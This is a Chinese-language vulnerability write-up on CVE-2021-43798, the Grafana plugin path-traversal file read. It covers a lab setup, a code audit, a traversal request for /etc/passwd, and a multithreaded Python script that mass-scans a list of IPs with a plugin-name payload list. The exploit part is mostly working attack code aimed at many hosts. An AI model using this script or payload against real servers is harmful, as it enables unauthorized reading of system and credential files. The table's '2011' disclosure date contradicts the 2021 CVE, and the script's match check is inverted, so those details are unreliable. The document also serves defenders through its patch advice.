
# 0X00 漏洞信息
Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。<br />Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。<br /> 攻击者可以通过将包含特殊目录便利字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞，成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的任意文件。


# 0X01 漏洞概述
| 漏洞名称 | Grafana 未授权任意文件读取漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-43798 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2011.11.16 |
| 分数 | 7.5 |
| CVSS | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) |


# 0X02 影响范围
Grafana 版本 8.0.0-beta1 到 8.3.0（补丁版本除外）


# 0X03 环境搭建
```javascript
docker pull vulfocus/grafana-read_arbitrary_file:latest
docker run -d -p 3000:3000 docker.io/vulfocus/grafana-read_arbitrary_file
```


# 0X04 代码审计
在GitHub上下载源码分析（V8.2.6）根据漏洞的请求路径r.Get("/public/plugins/:pluginId/*", hs.getPluginAssets)
![image.png](./assets/1660286730719-05e1557b-4815-401f-8b43-a494fefe49ef.png)

跟踪getPluginAssets方法后会发现从请求路径中获取/public/plugins/ 后的参数赋值给pluginID, 然后再被拼接至pluginFilePath进入文件读取片段
![image.png](./assets/1660286818118-0d24e5f2-516e-4b0c-b95c-73fa55194a2b.png)

requestedFile := filepath.Clean(web.Params(c.Req)["*"])
pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
就是通过默认存在的插件来拼接文件路径构造请求读取文件
![image.png](./assets/1660286843215-213c4a77-8752-46b2-afe3-7fc005556241.png)

插件路径 public/app/plugins/panel
![image.png](./assets/1660286865358-e1664f8a-a16d-4e32-8610-8e1403ed7921.png)


# 0X05 漏洞复现
随意抓取一个数据包修改请求头为
```javascript
/public/plugins/welcome/../../../../../../../../../etc/passwd
```
![image-20211208093559618.png](./assets/1660286218645-b63be7e9-6bef-4653-ac66-562fc5611ec2.png)


# 0X05 POC
Grafana8.x_check.py
```javascript
# -*- encoding: utf-8 -*-
# Time : 2021/12/07 23:05:31
# Author: crow
# Grafana plugins 任意文件读取批量检测脚本
# poc参考：https://github.com/ScorpionsMAX/Grafana-loophole


import requests
import threading
from queue import Queue


class Check_ips(threading.Thread):
    def __init__(self, queue, file_path):
        threading.Thread.__init__(self)
        self._queue = queue
        self._file_path = file_path
        

    def run(self):
        while not self._queue.empty():
            Ip = self._queue.get()
            file_path_ = self._file_path
            try:
                self.check(Ip, file_path_)
            except Exception as e:
                # print(e)
                pass

    def check(self, ip, file_path_):
        f = open("./paload.txt")
        print('正在测试ip:',ip)
        for line in f:
            url = "http://"+ ip +"/public/plugins/"+str.rstrip(line)+"/../../../../../../../../../../../etc/passwd"
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
            }
            req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False)
            a=req.text
            # print('当前a的值:',a)
            str1='root'
            if a in str1:
                print('确认存在'+str.rstrip(line)+'路径,并存在漏洞!')
                print(url)
                with open('Grafana 8.x_vuln.txt', 'a+') as ff:
                    ff.write(url + '\n')
            else:
                pass
                # print('不存在漏洞!')
                


def check_ip(file_path):
    queue = Queue()
    with open(file_path, 'r') as f:
        for line in f.readlines():
        # print(line[:-1])
            ip = line[:-1]
            # print('正在测试ip:',ip)       
            queue.put(ip)
        print('[+] Loading complite')
        threads = []
        thread_counts = 100  # 定义线程
        for i in range(thread_counts):
            threads.append(Check_ips(queue, file_path))
        for t in threads:
            t.start()
        for t in threads:
            t.join()



if __name__ == "__main__":   
    file_path = 'Grafana_3000.txt'
    check_ip(file_path)
    print('[+] check complete')
```

paload.txt<br />这个文件里面主要是 plugins 的插件名称
```javascript
alertmanager
grafana
loki
postgres
grafana-azure-monitor-datasource
mixed
prometheus
cloudwatch
graphite
mssql
tempo
dashboard
influxdb
mysql
testdata
elasticsearch
jaeger
opentsdb
zipkin
alertGroups
bargauge
debug
graph
live
piechart
status-history
timeseries
alertlist
candlestick
gauge
heatmap
logs
pluginlist
table
welcome
annolist
canvas
geomap
histogram
news
stat
table-old
xychart
barchart
dashlist
gettingstarted
icon
nodeGraph
state-timeline
text
```

Grafana_3000.txt<br />这个文件是需要检测的ip地址信息
```javascript
127.0.0.1:3000
```
![image-20211208102326400.png](./assets/1660286295017-d72be1b5-fb5d-4730-80fd-0ce225a13a50.png)


# 0X06 解决方案
根据官方发布说明，8.3.1已修复该漏洞，将Grafana版本更新到8.3.1即可。<br />[https://github.com/grafana/grafana/releases](https://github.com/grafana/grafana/releases)
[https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)
